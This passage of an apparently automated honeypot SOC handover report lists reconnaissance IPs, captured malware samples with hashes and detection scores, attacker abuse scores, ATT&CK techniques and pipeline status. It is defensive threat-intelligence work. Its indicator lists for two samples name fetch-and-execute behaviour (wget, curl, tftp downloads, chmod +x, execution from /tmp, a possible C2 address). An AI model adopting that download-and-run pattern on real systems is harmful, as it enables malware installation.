- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `80.251.153[.]178` | **89** | 2026-08-20 04:55 | 2026-08-20 06:54 | 113m | 0 | `T1592` | 🟠 MEDIUM |
| `34.62.216[.]83` | **30** | 2026-08-20 06:15 | 2026-08-20 06:15 | 2m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **4** | 2026-08-20 05:19 | 2026-08-20 06:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.105.128[.]12` | **3** | 2026-08-20 06:38 | 2026-08-20 06:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `213.174.1[.]231` | **2** | 2026-08-20 06:28 | 2026-08-20 06:28 | 0m | 0 | `T1592` | 🟢 LOW |
| `130.185.96[.]113` | 1 | 2026-08-20 05:54 | 2026-08-20 05:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]224` | 1 | 2026-08-20 05:51 | 2026-08-20 05:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `218.94.115[.]164` | 1 | 2026-08-20 05:08 | 2026-08-20 05:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `220.246.33[.]79` | 1 | 2026-08-20 05:57 | 2026-08-20 05:57 | 7s | 0 | `T1592` | 🟢 LOW |
| `223.107.146[.]186` | 1 | 2026-08-20 05:41 | 2026-08-20 05:41 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]18` | 1 | 2026-08-20 06:38 | 2026-08-20 06:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.77.61[.]56` | 1 | 2026-08-20 06:48 | 2026-08-20 06:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.115[.]59` | 1 | 2026-08-20 06:37 | 2026-08-20 06:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `50.217.255[.]171` | 1 | 2026-08-20 05:24 | 2026-08-20 05:24 | 7s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]53` | 1 | 2026-08-20 05:45 | 2026-08-20 05:45 | 4s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]77` | 1 | 2026-08-20 05:21 | 2026-08-20 05:21 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-08-20 06:34 | 2026-08-20 06:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `86.102.111[.]211` | 1 | 2026-08-20 06:13 | 2026-08-20 06:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `99.113.14[.]213` | 1 | 2026-08-20 05:35 | 2026-08-20 05:35 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 81/100 | 🔴 HIGH | **28/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 61/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `216.173.112[.]34` | US | FASTPLANET LTD | **100** ⚠️ | 14 |
| `49.124.153[.]16` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 43 |
| `50.217.255[.]171` | US | Comcast Cable Communications, LLC | **100** ⚠️ | 50 |
| `195.158.26[.]59` | UZ | Uzbektelekom Joint Stock Company | **100** ⚠️ | 50 |
| `181.212.174[.]164` | CL | TELEFONICA EMPRESAS CHILE SA | **100** ⚠️ | 4 |
| `178.178.222[.]61` | RU | PJSC MegaFon | **100** ⚠️ | 50 |
| `99.113.14[.]213` | US | AT&T Enterprises, LLC | **100** ⚠️ | 0 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 50 |
| `58.56.128[.]190` | CN | CHINANET SHANDONG PROVINCE NETWORK | **100** ⚠️ | 50 |
| `213.234.9[.]218` | RU | OAO Bank Petrokommerc | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 71 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 66 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 3 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 3 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 1 |

---

## 🔕 False Positive Summary (14 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 14 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 10 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 221 cases |
| Tool 34  | Credential Extractor        | ✅ 78 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 10 fingerprints |
| Tool 36  | Command Clustering          | ✅ 9 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 66 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 14 filtered (6.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 49 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 20 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 65 priority case(s) shown individually · 19 recon entry/entries in table (5 group(s) consolidating 128 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-20T08:43:02Z_
